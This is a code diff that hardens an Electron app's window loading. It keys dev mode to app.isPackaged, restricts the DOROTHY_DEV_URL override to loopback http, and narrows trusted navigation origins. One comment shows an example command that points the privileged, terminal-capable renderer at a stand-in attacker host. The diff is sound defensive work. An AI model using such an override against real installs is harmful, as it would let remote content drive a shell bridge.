@@ -8,6 +8,61 @@ import { DATA_DIR, MIME_TYPES, dataPath } from '../constants';
 // Global reference to the main window
 let mainWindow: BrowserWindow | null = null;
 
+/** Hosts a dev server may legitimately live on. Nothing else is loopback. */
+const LOOPBACK_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]']);
+
+/** Where `npm run dev` serves the renderer. */
+const DEFAULT_DEV_URL = 'http://localhost:3000';
+
+/**
+ * Is this an unpackaged (development) run?
+ *
+ * This used to be `process.env.NODE_ENV === 'development'`. NODE_ENV is
+ * inherited from whatever shell launched the app, so a developer with
+ * `export NODE_ENV=development` in a shell rc file made the *shipped, signed*
+ * build take the dev branch: no app:// handler, and the main window - which
+ * carries the whole electronAPI preload bridge, pty.create/pty.write included -
+ * loaded whatever happened to answer on localhost:3000, DevTools open.
+ * `app.isPackaged` is a property of the build itself and cannot be set by the
+ * launching environment.
+ */
+export function isDevBuild(): boolean {
+  return !app.isPackaged;
+}
+
+/** A plain-http URL on this machine, i.e. the dev server. */
+export function isLoopbackHttp(url: string): boolean {
+  try {
+    const parsed = new URL(url);
+    return parsed.protocol === 'http:' && LOOPBACK_HOSTS.has(parsed.hostname);
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * Resolve the dev-server URL for the main window.
+ *
+ * DOROTHY_DEV_URL used to go to loadURL verbatim, so
+ * `DOROTHY_DEV_URL=https://attacker.example ./Tars.app/Contents/MacOS/Tars`
+ * pointed the preload-privileged renderer at fully remote content. It is now
+ * honoured only in an unpackaged build, and only for a plain-http loopback
+ * origin - the same origins hardenWindow() treats as ours. Anything else falls
+ * back to the default dev server.
+ */
+export function resolveDevUrl(raw: string | undefined = process.env.DOROTHY_DEV_URL): string {
+  if (!raw) return DEFAULT_DEV_URL;
+  if (!isDevBuild()) {
+    console.error('DOROTHY_DEV_URL ignored, this is a packaged build:', raw);
+    return DEFAULT_DEV_URL;
+  }
+  if (!isLoopbackHttp(raw)) {
+    console.error('DOROTHY_DEV_URL ignored, not a loopback http:// URL:', raw);
+    return DEFAULT_DEV_URL;
+  }
+  return raw;
+}
+
 /**
  * Get the main window instance
  */
@@ -45,10 +100,10 @@ export function createWindow() {
 
   hardenWindow(mainWindow);
 
-  // Load the Next.js app
-  const isDev = process.env.NODE_ENV === 'development';
-  if (isDev) {
-    mainWindow.loadURL(process.env.DOROTHY_DEV_URL || 'http://localhost:3000');
+  // Load the Next.js app. The mode comes from the build, never from NODE_ENV -
+  // see isDevBuild().
+  if (isDevBuild()) {
+    mainWindow.loadURL(resolveDevUrl());
     if (!process.env.DOROTHY_E2E) {
       mainWindow.webContents.openDevTools();
     }
@@ -113,8 +168,12 @@ export function registerProtocolSchemes() {
  * links go to the user's browser, where they belong.
  */
 export function hardenWindow(window: BrowserWindow): void {
+  // A packaged build only ever runs from app://. The loopback origins are the
+  // dev server, and whitelisting them in the shipped app let a link surface
+  // walk the privileged renderer onto any http://localhost:PORT a user happens
+  // to be running.
   const isOurs = (url: string) =>
-    url.startsWith('app://') || url.startsWith('http://localhost:') || url.startsWith('http://127.0.0.1:');
+    url.startsWith('app://') || (isDevBuild() && isLoopbackHttp(url));
 
   window.webContents.on('will-navigate', (event, url) => {
     if (isOurs(url)) return;
@@ -187,8 +246,10 @@ export function setupProtocolHandler() {
     return new Response('Not Found', { status: 404 });
   });
 
-  const isDev = process.env.NODE_ENV === 'development';
-  if (!isDev) {
+  // Packaged builds serve the renderer from app://. Deciding this on NODE_ENV
+  // meant a stray `export NODE_ENV=development` left the shipped app with no
+  // app:// handler at all - see isDevBuild().
+  if (!isDevBuild()) {
     const basePath = getAppBasePath();
     console.log('Registering app:// protocol with basePath:', basePath);
 
